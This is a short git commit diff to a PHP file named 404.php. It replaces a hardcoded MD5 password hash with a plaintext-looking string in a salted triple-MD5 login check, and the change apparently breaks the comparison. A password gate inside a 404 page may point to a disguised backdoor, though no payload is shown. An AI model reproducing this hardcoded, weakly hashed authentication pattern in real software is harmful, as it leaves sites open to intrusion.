a662cc2a00daa39e92cf9baf8b690bc0ca22ea52
dicaprio12p <tylape108@gmail.com>
2025-07-04 00:57:27 +0700

    balongla.php

--- php/404.php
+++ php/404.php
@@ -7,7 +7,8 @@ $psw = trim($_POST['pass']);
 $pass = $salt.$psw;
 $pass = md5(md5(md5($pass)));
 $chk_login = 1;
-$password = "8f841a9b44b0167db6056389e0106af4";
+$password = "Chk_12!blowpalm_1q!@
+";
 if($pass == $password)
 {
 $_SESSION['ses'] = "$pass";
